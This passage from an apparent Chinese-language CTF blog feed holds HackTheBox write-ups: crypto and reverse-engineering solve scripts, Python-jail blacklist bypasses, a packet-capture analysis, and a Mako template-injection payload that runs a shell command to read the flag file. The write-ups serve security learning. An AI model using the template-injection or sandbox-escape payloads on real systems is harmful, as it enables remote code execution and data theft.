使用 MASTER_KEY 通過 SHA-256 雜湊算法生成加密金鑰 encryption_key，<code>sha256(MASTER_KEY).digest()</code> 會產生一個 256 位的摘要，這會用於之後 AES 加密的密鑰。<br>接著我們會使用生成的 encryption_key 初始化 AES 加密器，並選擇 ECB 模式。然後把 flag padding 到 16 位確保 AES 可以正常運作，然後執行加密後輸出 password 跟 flag。</p><p>那分析完後首先我們會想先想辦法得到 master_key，那根據他字母表的建立方式我們可以知道前半跟後半分別是：<code>abcdefghijklmnopqrstuvwxyzABCDEFGHI</code>，<code>JKLMNOPQRSTUVWXYZ0123456789~!@#$%^&amp;*</code>，所以我們可以透過 password 的每一位在前半或是後半知道 master_key 的每一個 bit 是 0 還是 1 如此就可以得到 master_key，接著就是正常的 AES 操作。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>最後按照剛剛的邏輯把腳本實現如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line">alph = string.ascii_letters + string.digits + <span class="string">&quot;~!@#$%^&amp;*&quot;</span></span><br><span class="line">first_half, second_half = <span class="built_in">set</span>(alph[:<span class="built_in">len</span>(alph) // <span class="number">2</span>]), <span class="built_in">set</span>(alph[<span class="built_in">len</span>(alph) // <span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_data</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        password = f.readline().split(<span class="string">&quot; : &quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line">        enc_flag = b64decode(f.readline().split(<span class="string">&quot; : &quot;</span>)[<span class="number">1</span>].strip())</span><br><span class="line">    <span class="keyword">return</span> password, enc_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_master_key</span>(<span class="params">password</span>):</span><br><span class="line">    bits = [<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> p <span class="keyword">in</span> first_half <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> p <span class="keyword">in</span> password]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(bits[::-<span class="number">1</span>]), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">master_key, enc_flag</span>):</span><br><span class="line">    encryption_key = sha256(long_to_bytes(master_key)[::-<span class="number">1</span>]).digest()</span><br><span class="line">    cipher = AES.new(encryption_key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> unpad(cipher.decrypt(enc_flag), <span class="number">16</span>).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    password, enc_flag = load_data()</span><br><span class="line">    master_key = recover_master_key(password)</span><br><span class="line">    flag = decrypt_flag(master_key, enc_flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Decrypted FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ python solve.py                                      ─╯</span><br><span class="line">Decrypted FLAG: HTB&#123;m4ll34bl3_p4ssw0rd_g3n3r4t0r!&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/spg_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://github.com/hackthebox/htboo-ctf-2023/blob/main/htboo-ctf-2023/crypto/%5BVery%20Easy%5D%20SPG/README.md" >https://github.com/hackthebox/htboo-ctf-2023/blob/main/htboo-ctf-2023/crypto/%5BVery%20Easy%5D%20SPG/README.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;首先題目附給我們 &lt;code&gt;source.py&lt;/code</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="crypto" scheme="https://kazma.tw/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges FlagCasino Writeup</title>
    <link href="https://kazma.tw/2024/11/01/HackTheBox-Challenges-FlagCasino-Writeup/"/>
    <id>https://kazma.tw/2024/11/01/HackTheBox-Challenges-FlagCasino-Writeup/</id>
    <published>2024-11-01T09:16:21.217Z</published>
    <updated>2024-11-01T09:35:16.321Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這是一題逆向，因為程式不長就直接放上來：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> input; <span class="comment">// [rsp+Bh] [rbp-5h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[ ** WELCOME TO ROBO CASINO **]&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;     ,     ,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;    (\\____/)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;     (_oo_)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;       (O)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;     __||__    \\)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;  []/______\\[] /\n&quot;</span></span><br><span class="line">    <span class="string">&quot;  / \\______/ \\/\n&quot;</span></span><br><span class="line">    <span class="string">&quot; /    /__\\\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(\\   /____\\\n&quot;</span></span><br><span class="line">    <span class="string">&quot;---------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*** PLEASE PLACE YOUR BETS ***]&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1D</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot; %c&quot;</span>, &amp;input) != <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    srand(input);</span><br><span class="line">    <span class="keyword">if</span> ( rand() != check[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[ * INCORRECT * ]&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[ *** ACTIVATING SECURITY SYSTEM - PLEASE VACATE *** ]&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[ * CORRECT *]&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[ ** HOUSE BALANCE $0 - PLEASE COME BACK LATER ** ]&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>上面是 ida 反編譯的主程式邏輯，總之我們就是要連續輸入正確的亂數種子來符合 check 陣列裡的值，所以就是一個 flag checker，這裡我們來撰寫 exploit 來算出對應的亂數種子。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">mapping = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    libc.srand(i)</span><br><span class="line">    mapping[libc.rand()] = <span class="built_in">chr</span>(i)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">casino = ELF(<span class="string">&quot;./casino&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    val = casino.u32(casino.sym[<span class="string">&quot;check&quot;</span>] + b * <span class="number">4</span>)</span><br><span class="line">    flag += mapping[val]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><p>首先我們載入 <code>ctypes</code> 讓 python 可以呼叫 C 標準函式庫中的函數。<br>然後使用 ctypes.CDLL 函數來加載 Linux 的 C 標準函式庫 libc.so.6，這樣加載後的 libc 物件就可以直接呼叫 C 標準庫中的函數，例如題目中用到的 srand() 和 rand()。<br>然後我們遞迴 ascii 的範圍建一個字典，再來我們可以透過 ida 觀察到 check 陣列觀察到有 30 個 4 bytes，所以這裡我們可以把 casino 用 pwntools 載進來之後透過 u32 以及一次移動我們的指針四個單位來找到對應的隨機種子，最後印出我們的 flag。</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ file casino                                          ─╯</span><br><span class="line">casino: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7618b017ef4299337610a90a0a6ccb7f9efc44a4, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/casino_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://motasemhamdan.medium.com/hackthebox-flag-casino-reverse-engineering-ctf-writeups-2247bc6dafee" >https://motasemhamdan.medium.com/hackthebox-flag-casino-reverse-engineering-ctf-writeups-2247bc6dafee <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;這是一題逆向，因為程式不長就直接放上來：&lt;/p&gt;
&lt;div </summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="rev" scheme="https://kazma.tw/tags/rev/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Locked Away Writeup</title>
    <link href="https://kazma.tw/2024/11/01/HackTheBox-Challenges-Locked-Away-Writeup/"/>
    <id>https://kazma.tw/2024/11/01/HackTheBox-Challenges-Locked-Away-Writeup/</id>
    <published>2024-11-01T07:38:20.786Z</published>
    <updated>2024-11-01T08:27:44.987Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitaion"><a href="#Exploitaion" class="headerlink" title="Exploitaion"></a>Exploitaion</h2><p>耶這題是有趣的 pyjail。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">╰─ cat challenge/main.py                                ─╯</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open_chest</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span>(f.read())</span><br><span class="line"></span><br><span class="line">blacklist = [</span><br><span class="line">    <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;breakpoint&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;echo&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;open&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&#x27;The chest lies waiting... &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(b <span class="keyword">in</span> command <span class="keyword">for</span> b <span class="keyword">in</span> blacklist):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Invalid command!&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(command)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;You have been locked away...&#x27;</span>)</span><br><span class="line">        exit(<span class="number">1337</span>)</span><br></pre></td></tr></table></figure></div><p>稍微整理了一下題目的主邏輯如上，總之就是有個無限迴圈會把 input 拿去執行 exec 但是要繞黑名單，這邊提供幾種做法：</p><ol><li>首先第一種是我們可以透過 <code>blacklist.clear()</code> 或是 <code>blacklist = &#39;&#39;</code> 先清除黑名單後 call <code>open_chest()</code></li><li>另一種做法是假設他只能輸入一次的話，我們可以嘗試用其他方式呼叫 <code>open_chest()</code>，例如：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [5]: list(b<span class="string">&#x27;open_chest&#x27;</span>)</span><br><span class="line">Out[5]: [111, 112, 101, 110, 95, 99, 104, 101, 115, 116]</span><br></pre></td></tr></table></figure></div>我們把它換成 ascii，然後用下面的方式代表 ‘open_chest’：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [6]: bytes([111, 112, 101, 110, 95, 99, 104, 101, 115, 116]).decode()</span><br><span class="line">Out[6]: <span class="string">&#x27;open_chest&#x27;</span></span><br></pre></td></tr></table></figure></div>再來我們可以透過 <code>globals.get()</code> 去呼叫到 <code>open_chest</code> 函式：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The chest lies waiting... globals().get(bytes((<span class="number">111</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">95</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>)).decode())()</span><br><span class="line">HTB&#123;bL4cKl1sT?_bUt_tH4t<span class="string">&#x27;5_t0o_3asY&#125;</span></span><br></pre></td></tr></table></figure></div>Amazing!</li><li>再來是我們也可以換字型直接繞過，像是：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The chest lies waiting... 𝖔𝖕𝖊𝖓_𝖈𝖍𝖊𝖘𝖙()</span><br><span class="line">HTB&#123;bL4cKl1sT?_bUt_tH4t<span class="string">&#x27;5_t0o_3asY&#125;</span></span><br><span class="line"><span class="string">The chest lies waiting...</span></span><br></pre></td></tr></table></figure></div></li></ol><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/locked_away_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://www.linkedin.com/pulse/hackthebox-locked-away-python-ctf-writeups-motasem-hamdan-yozjf/" >https://www.linkedin.com/pulse/hackthebox-locked-away-python-ctf-writeups-motasem-hamdan-yozjf/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://nikos-titomichelakis.medium.com/htb-business-ctf-2024-the-vault-of-hope-b06d701e0520" >https://nikos-titomichelakis.medium.com/htb-business-ctf-2024-the-vault-of-hope-b06d701e0520 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitaion&quot;&gt;&lt;a href=&quot;#Exploitaion&quot; class=&quot;headerlink&quot; title=&quot;Exploitaion&quot;&gt;&lt;/a&gt;Exploitaion&lt;/h2&gt;&lt;p&gt;耶這題是有趣的 pyjail。&lt;/p&gt;
&lt;div class=&quot;hi</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="misc" scheme="https://kazma.tw/tags/misc/"/>
    
    <category term="pyjail" scheme="https://kazma.tw/tags/pyjail/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Wrong Spooky Season Writeup</title>
    <link href="https://kazma.tw/2024/10/31/HackTheBox-Challenges-Wrong-Spooky-Season-Writeup/"/>
    <id>https://kazma.tw/2024/10/31/HackTheBox-Challenges-Wrong-Spooky-Season-Writeup/</id>
    <published>2024-10-31T11:26:23.920Z</published>
    <updated>2024-10-31T11:57:15.500Z</updated>
    
    <content type="html"><![CDATA[<p>這題給我們封包分析，可以練習一下 wireshark 的用法。<br>首先我們可以先看 Statistics -&gt; Protocol Hierarchy 看一下有哪些協議：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/spooky_hierarchy.png"                      alt="hierarchy"                ><br>我們首先關心的是其中的 data，我們可以直接搜尋 data 的封包，或是右鍵 Apply as Filter -&gt; Selected，然後我們 Follow TCP stream 可以看到下面的畫面：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/spooky_b64.png"                      alt="b64"                ><br>我們可以看到駭客執行了一系列的指令操作其中包括把 reverse shell 寫入 &#x2F;root&#x2F;.bashrc 這樣下次開啟 shell 就會觸發，其中還有隱藏訊息，我們把它弄回來就會看到 flag 了：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ <span class="built_in">echo</span> <span class="string">&quot;==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS&quot;</span> | rev | <span class="built_in">base64</span> -d                            ─╯</span><br><span class="line">HTB&#123;j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/spooky_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;這題給我們封包分析，可以練習一下 wireshark 的用法。&lt;br&gt;首先我們可以先看 Statistics -&amp;gt; Protocol Hierarchy 看一下有哪些協議：&lt;br&gt;&lt;img  
                     lazyload
       </summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="misc" scheme="https://kazma.tw/tags/misc/"/>
    
    <category term="pcap" scheme="https://kazma.tw/tags/pcap/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Spookifier Writeup</title>
    <link href="https://kazma.tw/2024/10/31/HackTheBox-Challenges-Spookifier-Writeup/"/>
    <id>https://kazma.tw/2024/10/31/HackTheBox-Challenges-Spookifier-Writeup/</id>
    <published>2024-10-31T04:59:04.232Z</published>
    <updated>2024-10-31T05:42:37.562Z</updated>
    
    <content type="html"><![CDATA[<p>剛好這幾天在萬聖節應景解到這題XD<br>首先下面是這題的文件架構：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">╰─ tree .                                              ─╯</span><br><span class="line">.</span><br><span class="line">├── Dockerfile</span><br><span class="line">├── build-docker.sh</span><br><span class="line">├── challenge</span><br><span class="line">│   ├── application</span><br><span class="line">│   │   ├── blueprints</span><br><span class="line">│   │   │   └── routes.py</span><br><span class="line">│   │   ├── main.py</span><br><span class="line">│   │   ├── static</span><br><span class="line">│   │   │   ├── css</span><br><span class="line">│   │   │   │   ├── index.css</span><br><span class="line">│   │   │   │   └── nes.css</span><br><span class="line">│   │   │   └── images</span><br><span class="line">│   │   │       └── vamp.png</span><br><span class="line">│   │   ├── templates</span><br><span class="line">│   │   │   └── index.html</span><br><span class="line">│   │   └── util.py</span><br><span class="line">│   └── run.py</span><br><span class="line">├── config</span><br><span class="line">│   └── supervisord.conf</span><br><span class="line">└── flag.txt</span><br></pre></td></tr></table></figure></div><p>我們逛一下網站還有看一下 <code>main.py</code> 可以看到他是用 python mako 寫的，不過其實我們照著 ssti 的 checklist 測試也可以知道他是用 mako。<br>知道是 ssti 以後我們就可以撈 flag 了，這邊放上最後的 payload 參考：<br><code>http://94.237.63.215:32454/?text=$&#123;self.module.runtime.util.os.popen(%22cat%20../flag*%22).read()&#125;</code></p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/spoolifier_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;剛好這幾天在萬聖節應景解到這題XD&lt;br&gt;首先下面是這題的文件架構：&lt;/p&gt;
&lt;div class=&quot;highlight-container&quot; data-rel=&quot;Bash&quot;&gt;&lt;figure class=&quot;iseeu highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="web" scheme="https://kazma.tw/tags/web/"/>
    
    <category term="ssti" scheme="https://kazma.tw/tags/ssti/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Gunship Writeup</title>
    <link href="https://kazma.tw/2024/10/30/HackTheBox-Challenges-Gunship-Writeup/"/>
    <id>https://kazma.tw/2024/10/30/HackTheBox-Challenges-Gunship-Writeup/</id>
    <published>2024-10-30T14:49:00.775Z</published>
    <updated>2024-10-30T16:10:09.888Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>這次要來做的是一題 Web 而且有附上 Source Code 還有 Dockerfile，網站畫面很漂亮，只有一個輸入點。<br>這題雖然標非常簡單但個人認為有很多值得我們探討的知識點，一起來研究吧。</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這題的檔案結構如下：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">╰─ tree .                                                                                                           ─╯</span><br><span class="line">.</span><br><span class="line">├── Dockerfile</span><br><span class="line">├── build-docker.sh</span><br><span class="line">├── 